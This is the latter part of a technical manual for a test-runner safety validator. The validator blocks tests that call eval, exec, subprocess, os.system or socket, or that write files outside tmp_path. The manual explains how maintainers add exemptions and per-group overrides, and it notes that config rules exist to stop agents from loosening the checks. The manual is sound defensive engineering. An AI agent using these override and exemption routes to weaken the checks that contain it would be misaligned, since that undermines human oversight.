**For pattern-based exemptions** (like `*.loader.exec_module`):

Add a new suffix or pattern check in `SafetyValidator._is_conftest_exempt_call()`:

```python
# Pattern match: *.new_pattern(...)
if resolved_name.endswith(".new_pattern"):
    conftest_exemptions.append(ConftestExemption(
        file=file_path,
        line=node.lineno,
        pattern=resolved_name,
        reason="conftest exemption: <explanation>",
    ))
    return True
```

Always add unit tests for new exemptions.

### 7.4 How to Customize Validation Overrides

Validation overrides are per-group and affect import-level detection only.

**To allow a blocked import for a specific group:**

Edit the group's `.conf` file:

```bash
VALIDATION_OVERRIDES="subprocess:allow,socket:allow"
```

**To allow a blocked import for all groups:**

Edit each affected `.conf` file individually, OR add the override to `all.conf` (which only affects `--group all` runs, not individual group runs).

**What overrides CANNOT do:**

- Override Category 1 dangerous calls (eval, exec, subprocess.run, os.system, etc.)
- Override Category 3 filesystem write detection
- Override Category 4 process/signal manipulation detection
- Override Category 5 database access detection

These are hardcoded safety boundaries that cannot be relaxed via configuration.

---

## 8. Troubleshooting

### 8.1 Common Failure Modes

**"ERROR: Group config not found"**

```
ERROR: Group config not found: scripts/test-groups/foo.conf
Available groups: all, guardrails, import-check, ingest, observability, retrieval, root, server
```

Cause: The `--group` argument does not match any `.conf` file. Check spelling and available groups.

**"ERROR: Group config is not tracked by git"**

```
ERROR: Group config 'scripts/test-groups/custom.conf' is not tracked by git. Refusing to source.
```

Cause: The `.conf` file exists but is not committed to git. The runner enforces this to prevent agents from creating malicious configs with permissive overrides. Solution: `git add` and commit the file.

**"ERROR: Path must resolve under tests/"**

```
ERROR: Path must resolve under tests/. Got: /home/user/RAG/src/something.py
```

Cause: The `--path` argument resolved to a location outside the `tests/` directory. The runner only allows test execution within `tests/`.

**"Safety validation: BLOCKED"**

The validator found BLOCK-severity violations. Check `.tmp-test-results/validation.json` for the specific violations. Common causes:

- A test file imports `subprocess`, `socket`, or another blocked module.
- A test file calls `eval()`, `exec()`, `os.system()`, or another blocked function.
- A test file writes to the filesystem outside `tmp_path`.

**"ERROR: pytest-json-report not installed"**

```
ERROR: pytest-json-report not installed. Install with: uv add --dev pytest-json-report
```

Cause: The `pytest-json-report` plugin is a hard requirement. Install it in the dev dependency group.

**"WARNING: pytest-timeout not installed"**

This is a soft warning -- the runner proceeds without per-test timeout enforcement. Install `pytest-timeout` for per-test timeout protection.

**Exit code 124 (timeout)**

The entire pytest run exceeded the total run timeout (`RUN_TIMEOUT` from group config or `--run-timeout` CLI flag). Possible causes:

- Tests are genuinely slow (increase `RUN_TIMEOUT`).
- A test is hanging (e.g., waiting on network, infinite loop). Install `pytest-timeout` for per-test enforcement.
- `RUN_TIMEOUT` is set too low for the test group.

### 8.2 Exit Code Reference

| Source | Code | Meaning |
|--------|------|---------|
| `check_pytest.py` | 0 | All files pass (no BLOCK violations) |
| `check_pytest.py` | 1 | At least one BLOCK violation |
| `check_pytest.py` | 2 | Validator internal error |
| `run-tests.sh` | 0 | Validation passed and all tests passed |
| `run-tests.sh` | 1 | Validation blocked OR tests failed |
| `run-tests.sh` | 2 | Argument error, config error, or validator error |
| `run-tests.sh` | 124 | Total run timeout exceeded (from `timeout` command) |
| pytest | 0 | All tests collected and passed |
| pytest | 1 | Tests were collected but some failed |
| pytest | 2 | Test execution was interrupted or collection error |
| pytest | 5 | No tests collected |

### 8.3 How to Debug Validation False Positives

A "false positive" occurs when the validator blocks code that is actually safe. Common scenarios:

**Scenario: Test imports a blocked module for mocking purposes**

```python
import subprocess  # Blocked! But only used for CompletedProcess type
from unittest.mock import patch

def test_something():
    result = subprocess.CompletedProcess(args=[], returncode=0)
    ...
```

Resolution options:
1. Move the import inside the test function (function-level imports get WARN for network libraries, but `subprocess` is always BLOCK at import level).
2. Add a validation override to the group config: `VALIDATION_OVERRIDES="subprocess:allow"`.
3. Use `subprocess.CompletedProcess` without importing `subprocess` by constructing the object differently.

Note: Even with the import override, any call to `subprocess.run()` etc. will still be blocked (Category 1 is never overridable).

**Scenario: File write appears unsafe but uses tmp_path indirectly**

```python
def test_write(tmp_path):
    output_dir = tmp_path / "output"
    output_dir.mkdir()
    path = output_dir / "result.txt"
    with open(str(path), "w") as f:  # May trigger: str(path) is not directly tmp_path
        f.write("data")
```

The `tmp_path` heuristic checks if the AST subtree of the path argument contains a `Name(id='tmp_path')` node. In the example above, `str(path)` does NOT contain a direct `tmp_path` reference because the path goes through an intermediate variable `path` and then `str()`. The heuristic cannot trace data flow through variable assignments.

Resolution options:
1. Use `tmp_path / "output" / "result.txt"` directly as the path argument to `open()`.
2. Use `Path.write_text()` on a path derived from `tmp_path` in a single expression.
3. Run with `--strict false` (default) -- in many cases the heuristic failure produces a WARN rather than a BLOCK.

**Scenario: conftest.py uses a pattern that looks dangerous but is legitimate**

If a conftest.py uses a pattern not covered by the existing exemptions (e.g., a new importlib loading pattern), add a new exemption following the instructions in Section 7.3.

**General debugging approach:**

1. Run the validator directly to see its output:
   ```bash
   python scripts/check_pytest.py tests/path/to/file.py --json 2>/dev/null | python -m json.tool
   ```
2. Check the `violations` array for the specific file, line, category, and pattern.
3. Read the source code at the indicated line to understand what triggered the detection.
4. Determine whether the detection is a true positive (genuine safety concern) or false positive (safe code that matches a detection pattern).
5. If false positive: use a group override (Section 7.4), refactor the code, or add a new exemption (Section 7.3).

---

## File Inventory

| File | Purpose |
|------|---------|
| `scripts/check_pytest.py` | AST safety validator (Python, stdlib only) |
| `scripts/run-tests.sh` | Test runner orchestrator (Bash) |
| `scripts/test-groups/ingest.conf` | Ingest group configuration |
| `scripts/test-groups/retrieval.conf` | Retrieval group configuration |
| `scripts/test-groups/guardrails.conf` | Guardrails group configuration |
| `scripts/test-groups/observability.conf` | Observability group configuration |
| `scripts/test-groups/server.conf` | Server group configuration |
| `scripts/test-groups/import-check.conf` | Import-check group configuration |
| `scripts/test-groups/root.conf` | Root-level tests group configuration |
| `scripts/test-groups/all.conf` | All tests group configuration |
| `.tmp-skill-output/test-runner-skill/SKILL.md` | Agent skill definition |
| `tests/scripts/test_check_pytest.py` | Validator unit tests |
| `.tmp-test-results/` | Ephemeral output directory (gitignored) |
